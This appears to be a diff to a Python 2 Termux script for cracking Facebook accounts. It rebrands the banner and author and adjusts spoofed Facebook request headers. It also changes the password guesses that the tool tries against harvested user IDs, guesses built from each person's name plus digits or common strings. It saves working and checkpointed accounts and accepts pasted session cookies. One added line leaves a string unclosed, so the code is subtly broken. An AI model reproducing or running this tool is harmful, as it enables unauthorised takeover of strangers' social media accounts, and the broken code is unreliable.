@@ -26,7 +26,7 @@ if not os.path.isfile('/data/data/com.termux/files/home/Oscar/...../node_modules
     time.sleep(5)
 bd = random.randint(2e+07, 3e+07)
 sim = random.randint(20000.0, 40000.0)
-header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.90', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 reload(sys)
 sys.setdefaultencoding('utf-8')
 c = '\x1b[1;32m'
@@ -72,12 +72,12 @@ logo = """
 \033[1;92m        O    O   SSSS   C     AAAA  RRRR     
 \033[1;92m        O    O       S  C     A  A  R  R      
 \033[1;92m         OOOO    SSSS    CCC  A  A  R  RR     
-                          OSCAR ALEX   V=2
 \033[1;91m  ______________________________________________
-\033[1;95m  Author   :     \033[1;93mOSCAR ALEX
-\033[1;95m  GANG     :     \033[1;92mJOKER SPECIAL FORCE 
-\033[1;95m  UNITY    :     \033[1;92mJOKER 007 UNITY 
-\033[1;95m  WHATSAPP :     \033[1;92m03451378304
+\033[1;95m  Author          :     \033[1;93mOSCAR ALEX
+\033[1;95m  Facebook     :     \033[1;92m Oscʌʀ Aɭɘx
+
+\033[1;92m   TURN CHALLENGES INTO CHANGES AND 
+\033[1;92m    AND  STRESS  INTO  THE  SUCCESS 
 \033[1;91m  ______________________________________________
 """
 def tik():
@@ -97,25 +97,25 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;91m  ______________________________________________     
+\033[1;91m  ______________________________________________    
 \033[1;92m         OOOO                                
 \033[1;92m        O    O   SSSS    CCC   AA   RRRR    
 \033[1;92m        O    O  S       C     A  A  R   R   
 \033[1;92m        O    O   SSSS   C     AAAA  RRRR     
 \033[1;92m        O    O       S  C     A  A  R  R      
 \033[1;92m         OOOO    SSSS    CCC  A  A  R  RR     
-                      \033[1;93OSCAR ALEX V=2
 \033[1;91m  ______________________________________________
-\033[1;95m  Author   :     \033[1;93mOSCAR ALEX
-\033[1;95m  GANG     :     \033[1;92mJOKER SPECIAL FORCE 
-\033[1;95m  UNITY    :     \033[1;92mJOKER 007 UNITY 
-\033[1;95m  WHATSAPP :     \033[1;92m03451378304
-\033[1;91m  _______________________________________________
-"""
-jalan("\033[1;91m _____________________________________________")     
+\033[1;95m  Author          :     \033[1;93mOSCAR ALEX
+\033[1;95m  Facebook     :     \033[1;92m Oscʌʀ Aɭɘx
 
-jalan("\033[1;95m              THE JOKER 007 UNITY")                   
-jalan("\033[1;91m _____________________________________________")
+\033[1;92m   TURN CHALLENGES INTO CHANGES AND 
+\033[1;92m    AND  STRESS  INTO  THE  SUCCESS 
+\033[1;91m  ______________________________________________
+"""
+jalan("\033[1;91m   _____________________________________________")     
+
+jalan("\033[1;95m         OSCAR ALEX THE NAME THE BRAND ")                   
+jalan("\033[1;91m   _____________________________________________")
  
 jalan("\033[1;93m WELCOME TO OSCAR ALEX WORLD ")	
 	
@@ -285,7 +285,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \x1b[1;95m\xe2\x95\xb0\xe2\x94\x80Oscar\xe2\x9e\xa4 ')
+    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Oscar\xe2\x9e\xa4 ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -349,7 +349,7 @@ def log_cookie():
     print ''
     try:
         cookie = raw_input(' Paste cookies here: ')
-        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
+        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.90', 
            'referer': 'https://m.facebook.com/', 
            'host': 'm.facebook.com', 
            'origin': 'https://m.facebook.com', 
@@ -491,7 +491,7 @@ def auto_crack():
 
     os.system('clear')
     print logo
-    print '\x1b[1;93m   ~~~~ Auto pass cracking ~~~~\x1b[1;91m'
+    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
     print '\x1b[1;92m[1] Public id cloning'
     print '\x1b[1;92m[2] Followers cloning'
@@ -591,14 +591,14 @@ def a_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;95mTHE JOKER 007 UNITY\x1b[1;91m'
+    print '\t\x1b[1;95mOSCAR ALEX THE NAME THE BRAND\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
         user = arg
         uid, name = user.split('|')
         try:
-            pass1 = name.lower() + '12345'
+            pass1 = name.lower() + '1122'
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
@@ -614,7 +614,7 @@ def a_s():
                 cp.close()
                 cps.append(uid + pass1)
             else:
-                pass2 = name.lower() + '1234'
+                pass2 = name.lower() + '112
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
@@ -726,7 +726,7 @@ def a_s():
                                             cp.close()
                                             cps.apppend(uid + pass8)
                                         else:
-                                            pass9 = '000786'
+                                            pass9 = '786786786'
                                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                             q = json.loads(data)
                                             if 'loc' in q:
@@ -768,7 +768,6 @@ def a_s():
     print 47 * '-'
     raw_input(' \x1b[1;93mPress enter to back')
     auto_crack()
-
 
 def crack_b():
     global toket
@@ -921,7 +920,7 @@ def c_s():
     print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;95mJOKER 007 UNITY\x1b[1;91m'
+    print '\t\x1b[1;95mOSCAR ALEX THE NAME THE BRAND \x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -1024,9 +1023,9 @@ def c_s():
     p.map(main, id)
     print 47 * '-'
     print ' \x1b[1;92mCrack Done'
-    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
     print 47 * '-'
-    raw_input('\x1b[1;93m Press enter to back')
+    raw_input(' \x1b[1;93mPress enter to back')
     choice_crack()
 
 def crack_b():
@@ -1186,7 +1185,7 @@ def n_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94mJOKER 007 UNITY\x1b[1;91m'
+    print '\t\x1b[1;95mOSCAR ALEX THE NAME THE BRAND \x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
@@ -1328,6 +1327,6 @@ def n_s():
     raw_input(' \x1b[1;93mPress enter to back')
     auto_crack()
 
-
 if __name__ == '__main__':
     reg()
+    
